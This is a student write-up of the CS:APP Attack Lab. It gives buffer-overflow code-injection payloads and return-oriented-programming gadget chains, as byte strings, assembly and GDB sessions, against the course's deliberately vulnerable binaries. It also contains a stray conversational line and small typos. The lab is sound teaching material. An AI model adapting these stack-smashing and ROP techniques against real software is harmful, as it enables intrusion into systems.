# CS:APP Attack Lab Report
**Name** SUNCHAOYI  

Use the `-q` flag when running the target programs to avoid connecting to the grading server: `./ctarget -q` / `./rtarget -q`.

## Part 1 Code Injection Attacks

### Level 1

First use `objdump -d ctarjet > ctarjet.asm` to analyze the machine instructions of the target program.

Analysis of the disassembly reveals the addresses of the key functions: `<test>`, `<getbuf>`, and `<touch1>`. The objective is to modify the control flow when `getbuf` returns. Normally, `getbuf` returns to address `0x401976` within `test`. The goal is to overwrite this return address with the address of `touch1`, which is `0x4017c0`.

Examination of the `<getbuf>` function shows that it allocates `0x28` (40) bytes on the stack for the input buffer. To successfully redirect execution, the exploit must completely fill this 40-byte buffer and then overwrite the subsequent 8 bytes on the stack, which hold the saved return address. The target address, `0x4017c0`, must be written in **little-endian byte order** in x86-64.

Therefore, the exploit string is:

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

Create a text file (e.g., `exploit.txt`) and construct the attack string according to the specified format (two hex digits per byte, separated by spaces). Use the following pipeline to convert the text file to raw bytes and feed them to the target program: `./hex2raw < exploit.txt | ./ctarget`.

### Level 2

The goal is to redirect program execution from `getbuf` to `touch2` by injecting code that sets `%rdi` to the cookie value, exploiting a buffer overflow vulnerability in the `Gets()` function call.

The initial step involves locating the call site of the `<Gets>` function. The instruction `call 401a40 <Gets>` is found at address `0x4017af`. Using GDB, a breakpoint is set at this address to inspect the runtime stack state.

```
(gdb) b *0x4017af
(gdb) r -q
(gdb) display /x %rsp
```

The inspection reveals the stack pointer (`%rsp`) holds the value `0x5561dc78`, which indicates the starting address of the input buffer allocated by `getbuf`.

The core of the exploit is a short sequence of machine instructions. This sequence is designed to load the cookie value (`0x59b997fa`) into the `%rdi` register and then transfer control to the `touch2` function.

```assembly
movq %0x59b997fa, %rdi
pushq %0x4017ec
retq
```

To obtain the raw machine code bytes corresponding to this assembly, the source is assembled and disassembled using `gcc` and `objdump`.

```bash
gcc -c exploit.s
objdump -d exploit.o
```

The final exploit string is constructed by placing this instruction byte sequence at the beginning of the buffer, padding the remaining buffer space up to 40 bytes with zeros, and then overwriting the saved return address on the stack. The return address is set to `0x5561dc78`, the buffer's start address, so that the `ret` instruction in `getbuf` transfers control to the injected code. The complete byte string is:

```
48 c7 c7 fa 97 b9 59 68 
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
```

Certainly. The exploit code may be positioned at any valid location within the buffer area. The following configuration represents an alternative valid solution:

```
00 00 00 00 00 00 00 00
48 c7 c7 fa 97 b9 59 68 
ec 17 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
80 dc 61 55 00 00 00 00
```

### Level 3

The key distinction is that Level 2 injects and executes code before any subsequent function calls overwrite the stack, whereas Level 3 must position its injected string in a region of the stack that will **not be overwritten** by the subsequent local buffer (`cbuf[110]`) allocated within the `hexmatch` function.

The cookie value must be converted into its hexadecimal string representation: `35 39 62 39 39 37 66 61` (corresponding to `"59b997fa"`).

After `getbuf` returns, its stack memory is effectively recycled and reused by `touch3` and `hexmatch`. Due to the random offset used within `hexmatch`, the only consistently safe area for storing data is within the `test` function's preserved stack region.

Inspection of the stack pointer at the entry to `touch3` reveals `%rsp = 0x5561dca0`. Therefore, a safe location for the cookie string is at `0x5561dca8`, just above this address.

```
(gdb) b getbuf
(gdb) p/x %rsp
%1 = 0x5561dca0
```

Verification using `gdb` confirms the safety of this address:

```
./hex2raw < exploit.txt > level.raw
(gdb) b touch3
(gdb) b hexmatch
(gdb) r -q < level.raw
(gdb) p/x %rsp
%1 = 0x5561dca8
(gdb) c
(gdb) p/x %rsp
%2 = 0x5561dc98
```

Stack Layout Analysis:

```
High address
│                              │
├──────────────────────────────┤ 0x5561dcd0
│ Other parts of test frame    │
├──────────────────────────────┤ 0x5561dcc8
│ Return address               │
│ (overwritten to 0x5561dca0)  │ ← exploit control flow
├──────────────────────────────┤ 0x5561dcc0
│ Possibly free                │
├──────────────────────────────┤ 0x5561dcb8
│ Possibly free                │
├──────────────────────────────┤ 0x5561dcb0
│ Potential injection point    │
├──────────────────────────────┤ 0x5561dca8
│ rsp position at touch3 entry │ ← rsp value you observed
├──────────────────────────────┤ 0x5561dca0
│ touch3 saved rbx             │ ← written by touch3 push %rbx
├──────────────────────────────┤ 0x5561dc98
│ hexmatch return address      │ ← written by call hexmatch
├──────────────────────────────┤ 0x5561dc90                    
│ hexmatch saved r12           │ ← written by push %r12       
├──────────────────────────────┤ 0x5561dc88                    
│ hexmatch saved rbp           │ ← written by push %rbp       
├──────────────────────────────┤ 0x5561dc80                    
│ hexmatch saved rbx           │ ← written by push %rbx       
├──────────────────────────────┤ 0x5561dc78                    
│ Original getbuf buffer area  │                              
├──────────────────────────────┤ 0x5561dc00                    
│ Start of hexmatch's cbuf[110]│ ← new stack top after add -128! 
│ ...                          │                                
│ cbuf[0]...cbuf[109]          │                                
├──────────────────────────────┤                                
│ Remaining hexmatch frame     │                                
Low Address
```

Address `0x5561dca8` remains safe because `touch3`'s `push %rbx` first decrements `%rsp` by 8 and then stores the value of `%rbx` at `0x5561dca0`, leaving `0x5561dca8` untouched.

The injected code should therefore set up the argument and transfer control:


```
movq %0x5561dca8, %rdi
pushq %0x4018fa
ret
```

Using the same construction method as Level 2, the final exploit string becomes (`0x5561dc78` %\sim% `0x5561dca8`) : 

```
48 c7 c7 a8 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
35 39 62 39 39 37 66 61
```

Placing the cookie string at `0x5561dcb0` is also feasible, requiring additional padding:

```
48 c7 c7 b0 dc 61 55 68
fa 18 40 00 c3 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00
00 00 00 00 00 00 00 00
35 39 62 39 39 37 66 61
```

## Part 2 Return-Oriented Programming

ROP is an exploitation technique that builds attack payloads by chaining existing, `ret`-terminated instruction snippets (gadgets). Gadgets are located via byte-aligned scanning of executable memory. The attacker controls the stack to sequence these gadgets, with each `ret` instruction transferring control to the next gadget in the chain.

In the assignment example, the byte sequence `48 89 c7 c3` is extracted from the instruction `c7 07 d4 48 89 c7    movl   %0xc78948d4, (%rdi)`. When execution begins at the `48` byte, this sequence is interpreted as the instruction `movq %rax, %rdi`. This is possible because x86-64 instructions are variable-length and lack alignment boundaries, allowing the same byte stream to be decoded as different instructions depending on the starting offset.

### Level 2
<img src="asm.png" width="60%" height="60%">

```assembly
movq %0x59b997fa, %rdi
pushq %0x4017ec
retq
```

This is the asnwer in Part 2. The straightforward approach would be to find a gadget that directly sets the value `0x59b997fa` into the `%rdi` register. However, searching through the gadget farm reveals that no such gadget exists in the available code.

Since a direct movq instruction with the immediate value is unavailable, an indirect approach is employed:

1. Place the value on the stack

    The cookie value `0x59b997fa` is included in the exploit string.

2. Use `popq %rax`

    Extract the value from the stack into a register.

3. Transfer to `%rdi`

    Move the value from `%rax` to `%rdi` using `movq %rax, %rdi`.

4. Return to `touch2`

The `popq %rax` instruction corresponds to the byte `58`. Examining the disassembled code reveals the following memory content `4019a7: 8d 87 51 73 58 90`. This sequence contains `58` followed by `90` (a `nop` instruction), forming a valid `popq %rax; nop` gadget. The execution should start at address `0x4019ab` to align the instruction boundaries correctly.

The `movq %rax, %rdi` instruction corresponds to the bytes `48 89 c7`. The disassembly shows `4019a0: 8d 87 48 89 c7 c3`. Starting execution at address `0x4019a3` causes the sequence `48 89 c7 c3` to be interpreted as `movq %rax, %rdi; ret`.

The complete exploit string is structured as follows:

```
00 00 00 00 00 00 00 00 # Padding for the buffer (40 bytes)
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ab 19 40 00 00 00 00 00 # Address of popq %rax gadget (0x4019ab)
fa 97 b9 59 00 00 00 00 # Cookie value to be popped into %rax
a3 19 40 00 00 00 00 00 # Address of movq %rax, %rdi gadget (0x4019a3)
ec 17 40 00 00 00 00 00 # Address of touch2 function (0x4017ec)
```

### Level 3

```assembly
movq    %0x5561dca8, %rdi
pushq   %0x4018fa
ret
```

This represents the ideal code injection solution from Part 2. However, due to the implementation of two defensive techniques (stack randomization and non-executable stack), the exploit must instead utilize the current stack pointer combined with a calculated offset. The fundamental approach is outlined below: 

```assembly
movq %rsp, %rax    # Capture current stack pointer
popq %rbx          # Load offset value from stack
addq %rbx, %rax    # Calculate string address: rsp + offset
movq %rax, %rdi    # Pass address as first argument to touch3
```

**Gadget Identification and Chain Construction**

1.  **`movq %rsp, %rax`** (Byte pattern `48 89 e0`)
    - Located at: `401a03: 8d 87 41 48 89 e0`
    - Execution starts at `0x401a06` to align the instruction.

2.  **`movq %rax, %rdi`** (Byte pattern `48 89 c7`)
    - Only `popq %rax` is available for loading data, not `popq %rbx`. Therefore, `%rax` is used as the primary data carrier.
    - Located at: `4019c3: c7 07 48 89 c7 90`
    - Execution starts at `0x4019c5`.

3.  **`popq %rax`** (Byte pattern `58`)
    - Located at: `4019a7: 8d 87 51 73 58 90`
    - Execution starts at `0x4019ab`. The offset value popped into `%rax` must have its upper 32 bits as zeros to be compatible with subsequent 32-bit operations.

    Since a direct `movq %rax, %rsi` gadget is unavailable, and `movl %eax, %edi` (`89 c7` at `0x4019c6`) cannot be constructed subsequently, an alternative register transfer chain using 32-bit moves is constructed:

    - **`movl %eax, %edx`** (Byte pattern `89 c2`)
        - Located at: `4019db: b8 5c 89 c2 90`
        - Execution starts at `0x4019dd`.
    - **`movl %edx, %ecx`** (Byte pattern `89 d1`)
        - Located at: `401a68: b8 89 d1 08 db`
        - Execution starts at `0x401a6a`. The following `orb %bl, %bl` instruction (`08 db`) has no net effect as it performs a bitwise OR of `%bl` with itself.
    - **`movl %ecx, %esi`** (Byte pattern `89 ce`)
        - Located at: `401a11: 8d 87 89 ce 90 90`
        - Execution starts at `0x401a13`.

4.  **`lea (%rdi,%rsi,1),%rax`**
    - This gadget performs the crucial address addition: `rax = rdi + rsi`.
    - Located at: `0x4019d6`, i.e. `add_xy` function.

5.  **`movq %rax, %rdi`** (Reuse gadget from step 2)
    - Finalizes the setup of the first argument for `touch3`.

The offset value of `0x48` is calculated as the difference between the string's position in the exploit buffer (`0x78`) and the value stored in `%rdi` (`0x30`).

The constructed exploit string, incorporating padding, gadget addresses, the offset value, and the cookie string, is as follows:

```
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
06 1a 40 00 00 00 00 00 # gadget1: movq %rsp, %rax @0x401a06
c5 19 40 00 00 00 00 00 # gadget2: movq %rax, %rdi @0x4019c5
ab 19 40 00 00 00 00 00 # gadget3: popq %rax       @0x4019ab
48 00 00 00 00 00 00 00 # offset value (0x48)
dd 19 40 00 00 00 00 00 # gadget4: movl %eax, %edx @0x4019dd
6a 1a 40 00 00 00 00 00 # gadget5: movl %edx, %ecx @0x401a6a
13 1a 40 00 00 00 00 00 # gadget6: movl %ecx, %esi @0x401a13
d6 19 40 00 00 00 00 00 # gadget7: lea (%rdi,%rsi,1),%rax @0x4019d6
c5 19 40 00 00 00 00 00 # gadget8: movq %rax, %rdi @0x4019c5
fa 18 40 00 00 00 00 00 # Address of touch3 @0x4018fa
35 39 62 39 39 37 66 61 # Cookie string: "59b997fa" (hex ASCII)
```